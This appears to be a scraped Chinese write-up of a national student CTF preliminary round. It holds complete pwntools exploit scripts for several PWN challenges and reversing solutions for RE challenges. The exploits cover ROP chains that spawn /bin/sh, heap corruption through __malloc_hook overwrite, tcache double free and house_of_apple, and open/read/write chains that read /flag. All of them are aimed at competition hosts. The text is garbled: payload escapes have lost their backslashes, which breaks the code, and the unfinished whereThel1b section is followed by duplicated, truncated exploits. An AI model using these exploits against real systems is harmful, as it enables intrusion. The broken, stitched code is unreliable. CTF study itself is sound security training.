# 第十七届全国大学生信息安全竞赛创新实践能力赛初赛Writeup

> 原文: https://www.ctfiot.com/182350.html
> ID: 182350

PWN

gostack （一血）

代码审计

根据题目提示，应该是栈溢出类的，然后先测试一下是不是溢出了，通过ida直接查看栈大小，这里直接模糊测试一下

所以测试”A”*0x218的填充，看一下返回地址是不是会被填充

然后发现并没有，盲猜是有判断长度的地方，所以直接用00字符去测试，成功了

这里既然挺多静态的go函数，虽然貌似是有go的system函数，但是不太会用，所以直接syscall来实现

exp

from pwn import*
context(arch='amd64', os='linux',log_level="debug")
context.terminal=["wt.exe","wsl.exe"]
#libc = ELF("../libc/")
# libc = ELF("./libc-so.6")
"""""
def xxx():
    p.sendlineafter("")
    p.sendlineafter("")
    p.sendlineafter("")
"""

def get_p(name):
    global p,elf 
    # p = process(name)
    p = remote("8.147.132.163",14137)
    elf = ELF(name)

get_p("./gostack")
pop_rsi = 0x000000000042138a
pop_rdx = 0x00000000004944ec
pop_rax = 0x40f984
pop_rdi = 0x00000000004a18a5
syscall = 0x00000000004616c9

payload = b"x00"*(0x208-0x8*7) + p64(pop_rdi) + p64(0) + p64(0)*5 + p64(pop_rsi)  + p64(0x05978D8) + p64(pop_rdx) + p64(0x30) + p64(pop_rax) + p64(0x0)+ p64(syscall)
payload += p64(pop_rdi) + p64(0x005978D8) + p64(0)*5 + p64(pop_rsi) + p64(0) +p64(pop_rdx) + p64(0) + p64(pop_rax) + p64(0x3b) + p64(syscall)
# gdb.attach(p,"b *0x0004A0A97") 
# sleep(2)
p.sendlineafter("Input your magic message :",payload)

sleep(0.2)
p.send(b"/bin/shx00")
p.interactive()

orange_cat_diary（二血）

代码审计

漏洞点一：UAF

漏洞点二：堆溢出 8字节

思路

通过堆溢出修改top chunk的大小，然后申请一个大chunk来使得top chunk进入unsorted bin，然后在申请0x68大小的chunk为我们劫持__malloc_hook做准备，在申请0x68大小的chunk时，我们就可以用遗留下来的bk值进行libc地址泄露

然后就可以通过UAF，实现申请到__malloc_hook，修改__malloc_hook为one_gadget

exp

from pwn import*
context(arch='i386', os='linux',log_level="debug")
context.terminal=["wt.exe","wsl.exe"]
libc = ELF("./libc-2.23.so")
# libc = ELF("./libc-so.6")
"""""
def xxx():
    p.sendlineafter("")
    p.sendlineafter("")
    p.sendlineafter("")
"""

def get_p(name):
    global p,elf 
    # p = process(name)
    p = remote("8.147.133.63",16173)
    elf = ELF(name)

def add(size,content):
    p.sendlineafter("Please input your choice:","1")
    p.sendlineafter("Please input the length of the diary content:",str(size))
    p.sendafter("Please enter the diary content:",content)

def show():
    p.sendlineafter("Please input your choice:","2")
    
def edit(size,content):
    p.sendlineafter("Please input your choice:","4")
    p.sendlineafter("Please input the length of the diary content:",str(size))
    p.sendafter("Please enter the diary content:",content)
def dele():
    p.sendlineafter("Please input your choice:","3")

get_p("./orange_cat_diary")
p.sendafter("Hello, I'm delighted to meet you. Please tell me your name.","AAA")
add(0x38,"AAAA")
edit(0x40,b"x00"*0x38+p64(0xfc1))

add(0xff0,"AAA")
add(0x68,b"A"*8)
show()

libc.address = u64(p.recvuntil("x7f")[-6:].ljust(0x8,b"x00")) - 1640 - 0x10 - libc.sym['__malloc_hook']
print(hex(libc.address))

one_gadget = 0xf03a4 + libc.address
dele()
edit(0x10,p64(libc.sym['__malloc_hook']-0x23))

add(0x68,b"A"*8)
add(0x68,b"x00"*0x13 + p64(one_gadget))

p.sendlineafter("Please input your choice:","1")
p.sendlineafter("Please input the length of the diary content:",str(0x20))

# gdb.attach(p,"")
p.interactive()

ezbuf

发包结构体分析

这题跟去年的题基本一致，复现过后，基本也会构造发包的结构体

有五个数据结构体

通过第三个数据来判断是那种类型，下面是类型表，以0为开始

typedef enum {
 PROTOBUF_C_TYPE_INT32,      /**< int32 */
 PROTOBUF_C_TYPE_SINT32,     /**< signed int32 */
 PROTOBUF_C_TYPE_SFIXED32,   /**< signed int32 (4 bytes) */
 PROTOBUF_C_TYPE_INT64,      /**< int64 */
 PROTOBUF_C_TYPE_SINT64,     /**< signed int64 */
 PROTOBUF_C_TYPE_SFIXED64,   /**< signed int64 (8 bytes) */
 PROTOBUF_C_TYPE_UINT32,     /**< unsigned int32 */
 PROTOBUF_C_TYPE_FIXED32,    /**< unsigned int32 (4 bytes) */
 PROTOBUF_C_TYPE_UINT64,     /**< unsigned int64 */
 PROTOBUF_C_TYPE_FIXED64,    /**< unsigned int64 (8 bytes) */
 PROTOBUF_C_TYPE_FLOAT,      /**< float */
 PROTOBUF_C_TYPE_DOUBLE,     /**< double */
 PROTOBUF_C_TYPE_BOOL,       /**< boolean */
 PROTOBUF_C_TYPE_ENUM,       /**< enumerated type */
 PROTOBUF_C_TYPE_STRING,     /**< UTF-8 or ASCII string */
 PROTOBUF_C_TYPE_BYTES,      /**< arbitrary byte sequence */
 PROTOBUF_C_TYPE_MESSAGE,    /**< nested message */
} ProtobufCType;

然后我们就可以依此类推出来

syntax="proto3";

message devicemsg{
    bytes whatcon = 1;
    sint64 whattodo = 2;
    sint64 whatidx = 3;
    sint64 whatsize = 4;
    uint32 whatsthis = 5;
}

网上都有生成的脚本 搜个probuf pwn基本上就出来

代码分析

函数0是什么都不干，纯解析我们发包的数据

函数1是申请0x30的chunk，然后copy数据进去

函数3是打印我们申请chunk的数据，但是最好用2次，不然会把我们标准输出和报错关掉

漏洞

函数2是漏洞所在

只有10次释放机会，虽然是UAF

思路

我们通过遗留的unsorted bin的bk来得到libc的地址，然后通过释放第一个0x40大小的chunk(就是我们申请的那个chunk)，然后打印出来heap地址，这样我们就可以通过UAF进行，一次任意地址写入

为什么是一次，我们要填充tcache bin，然后通过fastbin来实现double free

这样的操作需要刚好十次的释放

所以我们需要控制tcache bin的管理chunk，然后通过这个进去任意地址写

这块调试挺久的，我们可以通过处理发包数据的地方来实现，申请对应大小的chunk，就是控制我们whatcon的数据来实现申请对应大小chunk，然后先是通过_IO_2_1_stdout来实现泄露stack地址

再通过之前控制tcache bin的管理chunk，申请回管理chunk，往对应的bin里写入stack地址

然后在申请到对应stack的位置，进行ROP，就可以getshell

exp

from pwn import*
import pp_pb2

context(arch='i386', os='linux',log_level="debug")
context.terminal=["wt.exe","wsl.exe"]
libc_1 = ELF("./libc.so.6")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
"""""
def xxx():
    p.sendlineafter("")
    p.sendlineafter("")
    p.sendlineafter("")
"""
cont = pp_pb2.devicemsg()

def get_p(name):
    global p,elf 
    p = process(name,env={"LD_PRELOAD":"./libc.so.6 "})
    # p = remote("8.147.133.80",23682)
    elf = ELF(name)

def add(idx,mem):
    
    cont.whatcon=mem
    cont.whattodo=1
    cont.whatidx=idx
    cont.whatsize=0
    cont.whatsthis=0
    p.sendafter("WHAT DO YOU WANT?",cont.SerializeToString())

def show(idx):
    cont.whatcon=b"0"
    cont.whattodo=3
    cont.whatidx=idx
    cont.whatsize=0x20
    cont.whatsthis=0x20
    p.sendafter("WHAT DO YOU WANT?",cont.SerializeToString())

def dele(idx):
    cont.whatcon=b"B"*0xc0
    cont.whattodo=2
    cont.whatidx=idx
    cont.whatsize=0x20
    cont.whatsthis=0x20
    p.sendafter("WHAT DO YOU WANT?",cont.SerializeToString())

def clean(mem):
    cont.whatcon=mem
    cont.whattodo=0
    cont.whatidx=0
    cont.whatsize=0x20
    cont.whatsthis=0x20
    p.sendafter("WHAT DO YOU WANT?",cont.SerializeToString())
get_p("./pwn")
for i in range(9):
    add(i,b"A"*0x8)
# dele(0)
show(0)
libc_1.address = u64(p.recvuntil("x7f")[-6:].ljust(0x8,b"x00")) - 0x219ce0 - 0x1000

dele(0)
show(0)
p.recvuntil("Content:")
heap = u64(p.recv(5).ljust(0x8,b"x00")) * 0x1000 - 0x2000

print(hex(libc.address))
print(hex(heap))

for i in range(6):
    dele(i+1)

dele(7)
dele(8)
dele(7)

for i in range(7):
    add(i,b"A"*0x8)

environ = libc_1.sym['environ']
stdout = libc_1.sym['_IO_2_1_stdout_']
print(hex(environ))
add(7,p64((heap+0xf0) ^((heap+0x4e40)>>12)))

add(8,b"AAAAAA")
add(8,b"A")
add(8,p64(0)+p64(heap+0x10))
# # sleep(2)
# show(8)

# stack = u64(p.recvuntil("x7f")[-6:].ljust(0x8,b"x00"))
# print(hex(stack))

gdb.attach(p,"b *$rebase(0x001CBE)")
sleep(2)

clean((((p16(0)*2+p16(1)+p16(1)).ljust(0x10,b"x00")+p16(1)+p16(1)).ljust(0x90,b'x00')+p64(stdout)+p64(stdout)+p64(0)*5+p64(heap+0x10)).ljust(0xe0,b"x00"))

raw_input()
clean(p64(0xFBAD1800)+p64(0)*3+p64(environ)+p64(environ+8))

stack = u64(p.recvuntil("x7f")[-6:].ljust(0x8,b"x00")) - 0x1a8 + 0x40
print(hex(stack))
raw_input()

clean((((p16(0)*2+p16(0)+p16(0)+p16(1)).ljust(0x10,b"x00")+p16(1)+p16(1)).ljust(0x90,b'x00')+p64(0)+p64(0)+p64(stack)).ljust(0xa0,b"x00"))

# libc_1.address = libc.address

pop_rdi = 0x000000000002a3e5 + libc_1.address
system = libc.sym['system'] + libc.address
binsh = next(libc_1.search(b"/bin/sh"))
ret = 0x000000000002a3e6 + libc_1.address

raw_input()

clean((p64(ret)*2+p64(pop_rdi)+p64(binsh)+p64(libc_1.sym['system'])).ljust(0x58,b"x00"))

p.interactive()

EzHeap

代码审计

漏洞点，其他就基本上是标准菜单

思路

通过泄露出来heap和libc地址，然后就可以进行任意地址申请，原本用_IO_2_1_stdout来泄露stack地址，但是就会发现这个

memset会清空数据，然后printf的时候会报错，所以我们只能打_IO_list_all直接house_of_apple攻击，刚好最近整理了一下模板，但是我们申请到_IO_list_all会直接把它所有数据置零，所以申请在上方，不影响下面的正常执行，再通过read把数据恢复回去，不然会卡住

这里也可以用largebin attack，但是我堆布局有点问题，调用了其他系统调用(猜测是brk？)，然后就直接被沙箱终结进程了，所以直接修改_IO_list_all，再ORW读flag

exp

from pwn import*
context(arch='i386', os='linux',log_level="debug")
context.terminal=["wt.exe","wsl.exe"]
#libc = ELF("../libc/")
libc = ELF("./libc.so.6")
"""""
def xxx():
    p.sendlineafter("")
    p.sendlineafter("")
    p.sendlineafter("")
"""

def get_p(name):
    global p,elf 
    # p = process(name)
    p = remote("8.147.129.121",42446)
    elf = ELF(name)

def add(size,content):
    p.sendlineafter("choice >> ",'1')
    p.sendlineafter("size:",str(size))
    p.sendafter("content:",content)

def edit(idx,content):
    p.sendlineafter("choice >> ",'3')
    p.sendlineafter("idx:",str(idx))
    p.sendlineafter("size:",str(len(content)))
    p.sendafter("content:",content)  

def dele(idx):
    p.sendlineafter("choice >> ",'2')
    p.sendlineafter("idx:",str(idx))  

def show(idx):
    p.sendlineafter("choice >> ",'4')
    p.sendlineafter("idx:",str(idx))      
get_p("./EzHeap")

add(0x200,b"A"*0x8)
add(0x440,b"AAAA")
add(0x440,b"AAAAAA")
dele(1)
edit(0,b"A"*0x210)
show(0)

libc.address = u64(p.recvuntil("x7f")[-6:].ljust(0x8,b"x00")) - 0x21ace0
fd = libc.address + 0x21b0e0
edit(0,b"A"*0x200 + p64(0) + p64(0x451))

add(0x450,b"AAAAAA")

edit(0,b"A"*0x220)
show(0)
p.recvuntil("A"*0x220)
heap_addr = u64(p.recv(6).ljust(0x8,b"x00")) - 0x2510

print(hex(heap_addr))

edit(0,b"A"*0x200 + p64(0)+ p64(0x451)+p64(fd)*2)

add(0x440,b"AAAA")
dele(3)
add(0xa0,b"AAAA")
add(0xa0,b"AAAA")
add(0xa0,b"AAAA")
add(0xa0,b"AAAA")
add(0xa0,b"AAAA")
add(0xa0,b"AAAA")
add(0xa0,b"AAAA")
add(0xa0,b"AAAA")
add(0xa0,b"AAAA")
add(0xa0,b"AAAA")
add(0xa0,b"AAAA")

dele(13)
dele(12)
payload = b"A"*0x200 + p64(0) + p64(0x211) + p64((libc.sym['_IO_list_all']-0xa0)^((heap_addr + 0x25c0)>>12))
edit(0,payload)

add(0xa0,b"AAAA")

payload = p64(0x2185a0+libc.address) + p64(0x1bf3c0+libc.address) + p64(0x1be4c0+libc.address)+ p64(0x1beac0+libc.address) + p64(0x1da1c2+libc.address) *13 + p64(0)*3

add(0xa0,payload)

# for i in range(0x200//8):
# add(0x200,payload)

edit(13,payload+p64(heap_addr+0x2300))
fake_io_addr = heap_addr+0x2300
_IO_wfile_jumps = libc.sym["_IO_wfile_jumps"]
ret = 0x000000000002a3e6 + libc.address
ROP_addr = heap_addr + 0x2db0 + 0x10
setcontext = libc.sym['setcontext']
pop_rdi = 0x000000000002a3e5 + libc.address
pop_rdx =  0x000000000011f2e7 + libc.address
pop_rsi = 0x000000000002be51 + libc.address
pop_rax = 0x0000000000045eb0 + libc.address
syscall = 0x0000000000091316 + libc.address
FP = fake_io_addr
A = FP + 0x100
B = A + 0xe0 - 0x60

payload = (0xa0-0x10)*b"x00" + p64(A) # 
payload = payload.ljust(0xb0,b"x00") + p64(1)
payload = payload.ljust(0xc8,b"x00") + p64(_IO_wfile_jumps-0x40)
payload = payload.ljust(0x190,b"x00") + p64(ROP_addr) + p64(ret)
payload = payload.ljust(0xf0+0xe0,b"x00") + p64(B) + p64(setcontext + 61)

edit(0,payload)

payload = p64(pop_rax) + p64(2)  + p64(pop_rdi) + p64(ROP_addr+0x100) + p64(pop_rdx) + p64(0)*2 + p64(pop_rsi) + p64(0) + p64(syscall)
payload += p64(pop_rdi) + p64(3) + p64(pop_rdx) + p64(0x40) *2 + p64(pop_rsi) + p64(heap_addr+0x1000) + p64(libc.sym['read'])
payload += p64(pop_rdi) + p64(1) + p64(libc.sym['write'])

payload = payload.ljust(0x100,b"x00") + b"/flagx00"

edit(1,payload)

# gdb.attach(p,"b *&_IO_wfile_overflow")
# sleep(2)

p.sendlineafter("choice >> ",'5')
p.interactive()

SuperHeap （三血）

代码审计

直接先来漏洞点，再edit选项中

memmove没有检查大小，可以直接堆溢出

解决交互问题

看add的部分，先是base32解码

v117 = encoding_base32__ptr_Encoding_DecodeString(qword_41A120, v116);

然后是probuf数据反序列化

github_com_golang_protobuf_proto_Unmarshal(
             ptr,
             v117.0.len,
             cap,
             (unsigned int)off_2BD1C8,
             (_DWORD)p_mypackage_CTFBook,
             v26,
             v27,
             v28,
             v29,
             v82) )

再是每个数据进行base64解码

v118 = encoding_base64__ptr_Encoding_DecodeString(qword_41A138, p_mypackage_CTFBook->Title);

v119 = encoding_base64__ptr_Encoding_DecodeString(qword_41A138, p_mypackage_CTFBook->Author);

v120 = encoding_base64__ptr_Encoding_DecodeString(qword_41A138, p_mypackage_CTFBook->Isbn);

encoding_base64__ptr_Encoding_DecodeString(qword_41A138, p_mypackage_CTFBook->PublishDate);

其中base64和base32都简单，probuf序列化的话，网上刚好有提取的工具，但是跟ezbuf不同，ezbuf似乎只能手动提取，这个可以自动提取结构体，同ezbuf的操作，就可以进行序列化操作了

最后的发送数据模板：

cont = bookProto_pb2.CTFBook()
cont.title = base64.b64encode(title)
cont.author = base64.b64encode(author)
cont.isbn = base64.b64encode(isbn)
cont.publish_date = base64.b64encode(date)
cont.price = 41
cont.stock = 1
payload = base64.b32encode(cont.SerializeToString())

思路

除去交互数据格式，这题跟之前今年NaN招新赛，解出的某道题相似，程序实现search的功能，说明程序用链表来实现，那么堆大致应该有对应的book结构体，根据分析发现确实是有，大致结构如下:

struct book{
 char *title;
 char *Author;
 char *Isbon;
 char *PulishDate;
 float price;
 long int stcok;
}

所以我们先通过堆溢出泄露出来libc和heap地址，然后控制某个book的结构体，然后通过edit函数实现任意写，跟上题一样，我们打_IO_list_all，house_of_apple攻击，然后orw

本人是很喜欢泄露stack，再orw的，但是程序运行时，栈不是在原本我们所知的那个地方，所以没有再研究下去

exp

from pwn import*
import base64
import bookProto_pb2
context(arch='i386', os='linux',log_level="debug")
context.terminal=["wt.exe","wsl.exe"]
#libc = ELF("../libc/")
libc = ELF("./libc.so.6")
"""""
def xxx():
    p.sendlineafter("")
    p.sendlineafter("")
    p.sendlineafter("")
"""

cont = bookProto_pb2.CTFBook()

def get_p(name):
    global p,elf 
    # p = process(name)
    p = remote("8.147.133.230",40626)
    elf = ELF(name)

def add(idx,date,title=b"AA",author=b"AAAA",isbn=b"AAA"):
    p.sendlineafter("Enter your choice >","1")
    p.sendlineafter("Index:",str(idx))

    cont.title = base64.b64encode(title)
    cont.author = base64.b64encode(author)
    cont.isbn = base64.b64encode(isbn)
    cont.publish_date = base64.b64encode(date)
    cont.price = 41
    cont.stock = 1
    payload = base64.b32encode(cont.SerializeToString())
    p.sendlineafter("Special Data:",payload)

def edit(idx,date,title=b"AA",author=b"AAAA",isbn=b"AAA"):
    p.sendlineafter("Enter your choice >","4")
    p.sendlineafter("Index:",str(idx))

    cont.title = base64.b64encode(title)
    cont.author = base64.b64encode(author)
    cont.isbn = base64.b64encode(isbn)
    cont.publish_date = base64.b64encode(date)
    cont.price = 41
    cont.stock = 1
    payload = base64.b32encode(cont.SerializeToString())
    p.sendlineafter("Special Data:",payload)

def show(idx):
    p.sendlineafter("Enter your choice >","2")
    p.sendlineafter("Index:",str(idx))

def dele(idx):
    p.sendlineafter("Enter your choice >","3")
    p.sendlineafter("Index:",str(idx))    
get_p("./SuperHeap")
# sleep(2)
add(0,b"A"*0x20)
add(1,b"A"*0x430,title=b"BBBBB")
add(2,b"A"*0x430)
add(3,b"A"*0x430)

dele(2)
edit(0,b"A"*0x30)

show(0)
p.recvuntil("A"*0x30)

heap_addr = u64(p.recv(6).ljust(0x8,b"x00")) - 0x2e90

edit(0,b"A"*(0x70+0x440))
show(0)

libc.address = u64(p.recvuntil("x7f")[-6:].ljust(0x8,b"x00")) - 0x219ce0 - 0x1000
print(hex(heap_addr))
print(hex(libc.address))

payload = b"A"*0x28 + p64(0x41) + p64(heap_addr + 0x2e90) + p64(0x2cf0+heap_addr) + p64(0x2b50+heap_addr) + p64(libc.sym['_IO_list_all']) + p64(0x4044800000000000) + p64(200)

edit(0,payload)

edit(1,p64(0x3730+heap_addr))
print(hex(libc.sym['_IO_list_all']))

payload = b"A"*0x28 + p64(0x41) + p64(heap_addr + 0x2e90) + p64(0x2cf0+heap_addr) + p64(0x2b50+heap_addr) + p64(heap_addr+0x3730) + p64(0x4044800000000000) + p64(200)

edit(0,payload)

fake_io_addr = heap_addr + 0x3730
_IO_wfile_jumps = libc.sym["_IO_wfile_jumps"]
ROP_addr = heap_addr + 0x4000
ret = 0x000000000002a3e6 + libc.address
setcontext = libc.sym['setcontext']
pop_rdi = 0x000000000002a3e5 + libc.address
pop_rdx =  0x000000000011f2e7 + libc.address
pop_rsi = 0x000000000002be51 + libc.address

FP = fake_io_addr
A = FP + 0x100
B = A + 0xe0 - 0x60

payload = (0xa0-0x10)*b"x00" + p64(A) # 
payload = payload.ljust(0xb0,b"x00") + p64(1)
payload = payload.ljust(0xc8,b"x00") + p64(_IO_wfile_jumps-0x40)
payload = payload.ljust(0x190,b"x00") + p64(ROP_addr) + p64(ret)
payload = payload.ljust(0xf0+0xe0,b"x00") + p64(B) + p64(setcontext + 61)
edit(1,p64(0)*2+payload)

payload = b"A"*0x28 + p64(0x41) + p64(heap_addr + 0x2e90) + p64(0x2cf0+heap_addr) + p64(0x2b50+heap_addr) + p64(heap_addr+0x4000) + p64(0x4044800000000000) + p64(200)

edit(0,payload)

payload = p64(pop_rdi) + p64(ROP_addr+0x100) + p64(pop_rdx) + p64(0)*2 + p64(pop_rsi) + p64(0) + p64(libc.sym['open'])
payload += p64(pop_rdi) + p64(3) + p64(pop_rdx) + p64(0x40) *2 + p64(pop_rsi) + p64(heap_addr+0x1000) + p64(libc.sym['read'])
payload += p64(pop_rdi) + p64(1) + p64(libc.sym['write'])

payload = payload.ljust(0x100,b"x00") + b"/flagx00"
edit(1,payload)

# gdb.attach(p,"b *$rebase(0x020D1C7)")
# sleep(2)

p.sendlineafter("Enter your choice >","6")
# payload = b"A"*0x28 + p64(0x41) + p64(heap_addr + 0x2e90) + p64(0x2cf0+heap_addr) + p64(0x2b50+heap_addr) + p64(stack) + p64(0x4044800000000000) + p64(200)
# edit(0,payload)

p.interactive()

RE

asm_re

下载得到asm_re.txt，手动提取机器码，放到IDAx64进行识别

__int64 sub_0()
{
  __int64 v0; // x8
  __int64 v1; // x0
  _BYTE v3[4]; // [xsp+0h] [xbp-110h] BYREF
  unsigned int v4; // [xsp+4h] [xbp-10Ch]
  unsigned __int64 v5; // [xsp+8h] [xbp-108h]
  _BYTE *v6; // [xsp+10h] [xbp-100h]
  int k; // [xsp+18h] [xbp-F8h]
  int v8; // [xsp+1Ch] [xbp-F4h]
  int v9; // [xsp+20h] [xbp-F0h]
  int v10; // [xsp+24h] [xbp-ECh]
  int j; // [xsp+28h] [xbp-E8h]
  int v12; // [xsp+2Ch] [xbp-E4h]
  int v13; // [xsp+30h] [xbp-E0h]
  int i; // [xsp+34h] [xbp-DCh]
  __int64 v15; // [xsp+38h] [xbp-D8h]
  _BYTE *v16; // [xsp+40h] [xbp-D0h]
  int v17; // [xsp+4Ch] [xbp-C4h]
  __int64 v18; // [xsp+50h] [xbp-C0h]
  int v19; // [xsp+5Ch] [xbp-B4h]
  _DWORD v20[38]; // [xsp+60h] [xbp-B0h] BYREF
  __int64 v21; // [xsp+F8h] [xbp-18h]

  v21 = *MEMORY[0x1010];
  v19 = 0;
  v18 = 0xE84ui64;
  MEMORY[0x2A4](v20, 0xF10ui64, 152i64);
  v17 = MEMORY[0x2BC](0xE84ui64);
  v16 = v3;
  v5 = (4i64 * (unsigned int)(v17 + 1) + 15) & 0xFFFFFFFFFFFFFFF0ui64;
  MEMORY[0x1000]();
  v6 = &v3[-v5];
  v15 = v0;
  for ( i = 0; i < v17; ++i )
  {
    v13 = *(char *)(v18 + i);
    v12 = ((80 * v13 + 20) ^ 0x4D) + 30;
    *(_DWORD *)&v6[4 * i] = v12;
  }
  *(_DWORD *)&v6[4 * v17] = 0;
  for ( j = 0; j < v17; ++j )
  {
    v10 = *(char *)(v18 + j);
    v9 = ((80 * v10 + 20) ^ 0x4D) + 30;
    *(_DWORD *)&v6[4 * j] = v9;
  }
  MEMORY[0x2B0](0xEABui64);
  v8 = 1;
  for ( k = 0; k < v17; ++k )
  {
    if ( *(_DWORD *)&v6[4 * k] != v20[k] )
    {
      v8 = 0;
      break;
    }
  }
  if ( v8 )
    v1 = MEMORY[0x2B0](0xEADui64);
  else
    v1 = MEMORY[0x2B0](0xEDBui64);
  v19 = 0;
  v4 = 0;
  if ( *MEMORY[0x1010] != v21 )
    MEMORY[0x298](v1);
  return v4;
}

看到对密文逐字符进行((80 * v10 + 20) ^ 0x4D) + 30运算，逆向

encode = [0xD7, 0x1F, 0x00, 0x00, 0xB7, 0x21, 0x00, 0x00, 0x47, 0x1E, 0x00, 0x00, 0x27, 0x20, 0x00, 0x00, 0xE7, 0x26, 0x00, 0x00, 0xD7, 0x10, 0x00, 0x00, 0x27, 0x11, 0x00, 0x00, 0x07, 0x20, 0x00, 0x00, 0xC7, 0x11, 0x00, 0x00, 0x47, 0x1E, 0x00, 0x00, 0x17, 0x10, 0x00, 0x00, 0x17, 0x10, 0x00, 0x00, 0xF7, 0x11, 0x00, 0x00, 0x07, 0x20, 0x00, 0x00, 0x37, 0x10, 0x00, 0x00, 0x07, 0x11, 0x00, 0x00, 0x17, 0x1F, 0x00, 0x00, 0xD7, 0x10, 0x00, 0x00, 0x17, 0x10, 0x00, 0x00, 0x17, 0x10, 0x00, 0x00, 0x67, 0x1F, 0x00, 0x00, 0x17, 0x10, 0x00, 0x00, 0xC7, 0x11, 0x00, 0x00, 0xC7, 0x11, 0x00, 0x00, 0x17, 0x10, 0x00, 0x00, 0xD7, 0x1F, 0x00, 0x00, 0x17, 0x1F, 0x00, 0x00, 0x07, 0x11, 0x00, 0x00, 0x47, 0x0F, 0x00, 0x00, 0x27, 0x11, 0x00, 0x00, 0x37, 0x10, 0x00, 0x00, 0x47, 0x1E, 0x00, 0x00, 0x37, 0x10, 0x00, 0x00, 0xD7, 0x1F, 0x00, 0x00, 0x07, 0x11, 0x00, 0x00, 0xD7, 0x1F, 0x00, 0x00, 0x07, 0x11, 0x00, 0x00, 0x87, 0x27, 0x00, 0x00]

data = []
for i in range(len(encode) // 4):
    data.append(int.from_bytes(encode[i*4:i*4+4],"little"))

for i in range(len(data)):
    data[i] -= 0x1e
    data[i] ^= 0x4d
    data[i] -= 0x14
    data[i] //= 0x50
print("".join(map(chr,data)))

flag{67e9a228e45b622c2992fb5174a4f5f5}

androidso_re

jadx找主程序，在legal函数中做了格式和内容的校验，格式首尾为flag{}并且长度为38

package com.example.re11113;

import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;

/* loaded from: classes3.dex */
public class MainActivity extends AppCompatActivity implements View.OnClickListener {
    private EditText editText;

    private boolean legal(String paramString) {
        return paramString.length() == 38 && paramString.startsWith("flag{") && paramString.charAt(paramString.length() - 1) == '}' && !inspect.inspect(paramString.substring(5, paramString.length() - 1));
    }

    @Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(C0586R.layout.activity_main);
        this.editText = (EditText) findViewById(C0586R.C0589id.edit_text);
        ((Button) findViewById(C0586R.C0589id.Button)).setOnClickListener(this);
    }

    @Override // android.view.View.OnClickListener
    public void onClick(View v) {
        Log.d("Button ID", "Button ID: " + v.getId());
        switch (v.getId()) {
            case C0586R.C0589id.Button /* 2131230723 */:
                if (legal(this.editText.getText().toString())) {
                    Toast.makeText(this, "You are right.", 0).show();
                    return;
                } else {
                    Toast.makeText(this, "You are wrong.", 0).show();
                    return;
                }
            default:
                return;
        }
    }
}

跟入inspect函数，可以看到时DES加密最后比较字符串JqslHrdvtgJrRs2QAp+FEVdwRPNLswrnykD/sZMivmjGRKUMVIC/rw==

package com.example.re11113;

import android.util.Base64;
import java.nio.charset.StandardCharsets;
import java.util.Arrays;
import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

/* loaded from: classes3.dex */
public class inspect {
    public static boolean inspect(String input_str) {
        try {
            byte[] input_flag = input_str.getBytes(StandardCharsets.UTF_8);
            byte[] str2 = jni.getkey().getBytes(StandardCharsets.UTF_8);
            Arrays.copyOf(str2, 8);
            SecretKeySpec key = new SecretKeySpec(str2, "AES");
            IvParameterSpec iv = new IvParameterSpec(jni.getiv().getBytes(StandardCharsets.UTF_8));
            Cipher cipher = Cipher.getInstance("DES/CBC/PKCS5Padding");
            cipher.init(1, key, iv);
            if (!Base64.encodeToString(cipher.doFinal(input_flag), 0).trim().equals("JqslHrdvtgJrRs2QAp+FEVdwRPNLswrnykD/sZMivmjGRKUMVIC/rw==")) {
                return true;
            }
            return false;
        } catch (Exception exception) {
            exception.printStackTrace();
            return true;
        }
    }
}

没有保护，直接hook加密位置，找key和iv

解密

flag{188cba3a5c0fbb2250b5a2e590c391ce}

whereThel1b

cython程序，很难看懂，尝试爆破，改写一下whereistheflag.py代码

首先猜测flag格式，根据前面的题可以得到两种flag格式

flag{b2bb0873-8cae-4977-a6de-0e298f0744c3}

flag{67e9a228e45b622c2992fb5174a4f5f5}


```
from pwn import*
context(arch='amd64', os='linux',log_level="debug")
context.terminal=["wt.exe","wsl.exe"]
#libc = ELF("../libc/")
# libc = ELF("./libc-so.6")
"""""
def xxx():
    p.sendlineafter("")
    p.sendlineafter("")
    p.sendlineafter("")
"""

def get_p(name):
    global p,elf 
    # p = process(name)
    p = remote("8.147.132.163",14137)
    elf = ELF(name)

get_p("./gostack")
pop_rsi = 0x000000000042138a
pop_rdx = 0x00000000004944ec
pop_rax = 0x40f984
pop_rdi = 0x00000000004a18a5
syscall = 0x00000000004616c9

payload = b"x00"*(0x208-0x8*7) + p64(pop_rdi) + p64(0) + p64(0)*5 + p64(pop_rsi)  + p64(0x05978D8) + p64(pop_rdx) + p64(0x30) + p64(pop_rax) + p64(0x0)+ p64(syscall)
payload += p64(pop_rdi) + p64(0x005978D8) + p64(0)*5 + p64(pop_rsi) + p64(0) +p64(pop_rdx) + p64(0) + p64(pop_rax) + p64(0x3b) + p64(syscall)
# gdb.attach(p,"b *0x0004A0A97") 
# sleep(2)
p.sendlineafter("Input your magic message :",payload)

sleep(0.2)
p.send(b"/bin/shx00")
p.interactive()
```



```
from pwn import*
context(arch='i386', os='linux',log_level="debug")
context.terminal=["wt.exe","wsl.exe"]
libc = ELF("./libc-2.23.so")
# libc = ELF("./libc-so.6")
"""""
def xxx():
    p.sendlineafter("")
    p.sendlineafter("")
    p.sendlineafter("")
"""

def get_p(name):
    global p,elf 
    # p = process(name)
    p = remote("8.147.133.63",16173)
    elf = ELF(name)

def add(size,content):
    p.sendlineafter("Please input your choice:","1")
    p.sendlineafter("Please input the length of the diary content:",str(size))
    p.sendafter("Please enter the diary content:",content)

def show():
    p.sendlineafter("Please input your choice:","2")
    
def edit(size,content):
    p.sendlineafter("Please input your choice:","4")
    p.sendlineafter("Please input the length of the diary content:",str(size))
    p.sendafter("Please enter the diary content:",content)
def dele():
    p.sendlineafter("Please input your choice:","3")

get_p("./orange_cat_diary")
p.sendafter("Hello, I'm delighted to meet you. Please tell me your name.","AAA")
add(0x38,"AAAA")
edit(0x40,b"x00"*0x38+p64(0xfc1))

add(0xff0,"AAA")
add(0x68,b"A"*8)
show()

libc.address = u64(p.recvuntil("x7f")[-6:].ljust(0x8,b"x00")) - 1640 - 0x10 - libc.sym['__malloc_hook']
print(hex(libc.address))

